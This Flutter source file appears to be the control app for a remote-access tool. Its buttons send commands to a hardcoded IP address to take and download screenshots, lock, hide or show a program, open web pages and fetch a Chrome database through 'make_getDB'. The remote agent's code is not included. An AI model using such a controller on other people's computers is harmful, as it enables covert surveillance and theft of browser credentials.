import 'dart:io';
import 'dart:math';
import 'dart:typed_data';

import 'package:flutter/material.dart';
import 'dart:async';
import 'package:http/http.dart' as http;

void main() {
  runApp(MyApp());
}

class MyApp extends StatelessWidget {
  // This widget is the root of your application.
  @override
  Widget build(BuildContext context) {
    return MaterialApp(
      debugShowCheckedModeBanner: false,
      title: 'Remote',
      theme: ThemeData(
        primarySwatch: Colors.deepPurple,
        visualDensity: VisualDensity.adaptivePlatformDensity,
      ),
      home: MyHomePage(),
    );
  }
}

class MyHomePage extends StatefulWidget {
  MyHomePage({Key key, this.title}) : super(key: key);
  final String title;

  @override
  _MyHomePageState createState() => _MyHomePageState();
}

class _MyHomePageState extends State<MyHomePage> {
  String text = "respone here";
  Widget img;
  Future<Uint8List> request(String arg) async {
    var url = '194.67.87.25:81';
    final queryParameters = {'arg': arg};
    final uri = Uri.http(url, '/', queryParameters);
    final headers = {HttpHeaders.contentTypeHeader: 'application/json'};
    final response = await http.get(uri, headers: headers);
    print(response.body);
    setState(() {
      text = response.body.substring(0, min(30, response.body.length));
    });
    return response.bodyBytes;
  }

  void makeScreen() async {
    request("make_screen");
  }

  void exit() async {
    request("make_exit");
  }

  void lock() async {
    request("make_lock");
  }

  void show() async {
    request("make_show");
  }
  void openSite() async {
    request("make_openWebPage");
  }
  void hide() async {
    request("make_hide");
  }
  void chromeDb() async {
    request("make_getDB");
  }
  void lastCheckOut() async {
    request("lastCheckOut");
  }
  void clear() async {
    request("clear");
  }
  void makeMinimise() async {
    request("make_minimise");
  }
  void makeSound1() async {
    request("make_sound1");
  }
  void getimg() async {
    Uint8List data = await request("getImg");

    setState(() {
      img = (Image.memory(data));

      text = "saved";
    });
  }
  @override
  Widget build(BuildContext context) {
    return Scaffold(

      body: Center(
        child: Container(
          decoration: BoxDecoration(
              boxShadow: <BoxShadow>[
                BoxShadow(
                    color: Colors.black54,
                    blurRadius: 15.0,
                    offset: Offset(0.0, 0.75)
                )
              ],
              color: Colors.white70
          ),
          child: ListView(
          shrinkWrap: true,
          padding: EdgeInsets.all(5.0),
          children: <Widget>[
            Column(children:[ img==null?new Text("img"):img],),
            Center(child: Text(
              text,
              style: Theme.of(context).textTheme.headline4,
            ),),
            Row(children: [
              FloatingActionButton(
                onPressed: makeScreen,
                child: Icon(Icons.image),
              ),
              FloatingActionButton(
                onPressed: getimg,
                child: Icon(Icons.cloud_download),
              ),
            ],mainAxisAlignment: MainAxisAlignment.center),
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
                FloatingActionButton(
                  onPressed: lastCheckOut,
                  child: Icon(Icons.timer),
                ),
                Text("  | ", style: TextStyle(fontSize: 43),),
                FloatingActionButton(
                  onPressed: makeSound1,
                  child: Icon(Icons.surround_sound, color: Colors.red,),
                ),
                FloatingActionButton(
                  onPressed: makeMinimise,
                  child: Icon(Icons.close_fullscreen_rounded, color: Colors.blue,),
                ),
                FloatingActionButton(
                  onPressed: openSite,
                  child: Icon(Icons.web_outlined, color: Colors.green,),
                ),
              ],
            ),
            Row(
              mainAxisAlignment: MainAxisAlignment.center,
              children: [
              FloatingActionButton(
                onPressed: lock,
                child: Icon(Icons.lock),
              ),
                Text(" | ", style: TextStyle(fontSize: 43),),
              FloatingActionButton(
                onPressed: chromeDb,
                child: Icon(Icons.cloud_download_outlined, color: Colors.red,),
              ),
            ],),

            Row(
                children: [
                  FloatingActionButton(
                    onPressed: clear,
                    child: Icon(Icons.clear),
                  ),
                  Text(" Clear",style: Theme.of(context).textTheme.headline5,)
                ],
                mainAxisAlignment: MainAxisAlignment.center
            ),
            Row(children: [
              FloatingActionButton(
                onPressed: show,
                child: Icon(Icons.remove_red_eye),
              ),
              FloatingActionButton(
                onPressed: hide,
                child: Icon(Icons.panorama_fish_eye),
              ),
            ], mainAxisAlignment: MainAxisAlignment.center),
            FloatingActionButton(
              onPressed: exit,
              child: Icon(Icons.exit_to_app),
            ),
          ],
        ),
      ),

      // This trailing comma makes auto-formatting nicer for build methods.
    ));
  }
}
